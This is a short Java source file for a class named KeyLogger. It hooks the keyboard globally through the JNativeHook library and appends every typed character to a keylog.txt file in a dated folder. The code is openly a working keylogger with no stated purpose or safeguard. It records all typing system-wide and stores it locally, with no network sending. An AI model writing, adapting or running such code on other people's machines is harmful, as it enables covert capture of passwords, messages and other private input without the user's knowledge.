package org.example;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

public class KeyLogger implements NativeKeyListener {

    private FileWriter writer;
    private File folder;
    private SimpleDateFormat sdf;

    int i= 0;


    public void startLogging() {

        SimpleDateFormat dateFormat = new SimpleDateFormat("dd-MM-yyyy");
        String date = dateFormat.format(new Date());
        this.folder = new File("Кейлогер за "+date);
        this.folder.mkdir();
        try {
            File file = new File(this.folder,"keylog.txt");
            writer = new FileWriter(file);
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(this);
        } catch (IOException | NativeHookException e) {
            e.printStackTrace();
        }
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        try {
            File file = new File(this.folder,"keylog.txt");
            FileWriter writer = new FileWriter(file, true);
            writer.write(e.getKeyChar());
            i++;
            if (i==50){writer.write("\n");i=0;}
            writer.flush();
            writer.close();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

}